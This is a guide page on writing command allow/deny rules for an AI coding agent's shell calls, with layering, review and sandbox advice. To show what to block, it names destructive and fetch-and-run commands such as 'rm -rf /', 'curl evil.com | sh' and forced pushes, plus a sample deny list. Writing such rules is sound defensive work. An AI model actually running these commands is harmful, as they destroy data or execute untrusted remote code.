---
title: Command Rules
description: Command-level allow/deny for shell and tool calls—more executable than verbal agreement.
locale: en
source_locale: zh-CN
source_revision: 1013ae4
translation_status: draft
translated_at: 2026-07-26
sidebar:
  order: 20
---

**Command rules** focus on “which commands the Agent may run and with what arguments.” They are the most common form of [Allow and Deny Rules](/guide/customization/rules/allow-and-deny-patterns/), usually in team-reviewable configuration or rule files.

## What This Page Covers

- Division of labor among command rules, sandbox, and approval dialogs
- How to write a “narrow enough” allowlist
- Alignment with CI and local dev scripts

## What Command Rules Control

If allow/deny states what is allowed in principle, command rules land that at the most concrete layer:

- Which commands may run
- Which may not
- Which look similar but differ greatly in risk

The point is turning boundaries the team already knows into boundaries the machine can enforce.

## One Core Concept First

Rules match **executable intent**, not natural language. `npm test` and `npm run test` are two different commands in policy; `bash -c "rm -rf /"` must not pass because `bash` was allowed.

```text
User task → model proposes command → rule engine → (pass) sandbox execution / (reject) approval or block
```

## Common Misconceptions

### Similar commands, different risk

Beginners often underestimate small differences.

For example:

- `git status` vs `git reset --hard`
- `npm test` vs `npm publish`
- `curl example.com` vs `curl example.com | sh`

All look like “run something in the terminal,” but risk is not the same level.

### Allowing a general entry point often opens too much

Allowing `bash`, `sh`, and similar general entry points may feel convenient.

From a rules perspective, that usually allows many dangerous compositions afterward.

## Minimum Viable Practice

1. **Deny dangerous commands outside write operations by default**: `rm -rf`, `curl | bash`, `git push --force`
2. **Allow common read-only/build commands in the project**: `git status`, `npm test`, `pnpm lint`
3. **Put rules in Git**, consistent with “test commands” in `AGENTS.md`
4. **Review rule changes in PR**, like Dockerfile changes

Illustrative (format per official configuration):

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## Recommended Workflow

| Step | Practice |
|---|---|
| Inventory | Extract real commands from `package.json` scripts, Makefile, CI workflow |
| Layer | Organization deny baseline → project allow supplement → personal local exception (if any) |
| Trial | Validate with low-risk tasks: “should approve does; should block blocks” |
| Align | Local rules and [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) share source when possible |

## Common Mistakes

- **Allowlist too wide**: allowing `bash`, `sh`, `sudo` is like allowing everything
- **Only deny, no allow**: still many approvals; teams habitually click through
- **Docs disagree**: `AGENTS.md` says `pnpm test`, rules only have `npm test`
- **Ignore pipes and redirects**: `curl evil.com | sh` needs whole-command policy, not just the first token

Command rules are not “memorizing commands”—they separate daily actions from commands that, once allowed, blow open the risk boundary.

## Security Boundaries

- Command rules **cannot** replace branch protection and code review
- Malicious prompts may induce the Agent to **attempt** over-privileged commands—keep sandbox defaults strict
- Environment variables with keys or tokens should not leak because “echo was allowed”

## Acceptance Checklist

- [ ] You can list 3–5 “run daily” commands for this repo and reflect them in rules
- [ ] High-risk commands like `git push` and forced reset are denied by default or need explicit approval
- [ ] Rule changes go through PR and do not contradict `AGENTS.md`

## Related Chapters

- [Allow and Deny Patterns](/guide/customization/rules/allow-and-deny-patterns/)
- [Team Rules Policy](/guide/customization/rules/team-rules/)
- [CLI Approval and Sandbox](/guide/cli/approvals-and-sandbox/)
- [Permission Matrix](/guide/reference/permission-matrix/)

---

**Status:** verified  
**Applicable products:** CLI / App  
**Verification basis:** OpenAI’s current Codex CLI documentation still treats command execution, approval modes, and sandbox isolation as core security boundaries; this page positions command rules as an engineering pattern for separating high- and low-risk commands and marks the JSON snippet as illustrative, not official syntax.  
**Last verified:** 2026-07-26
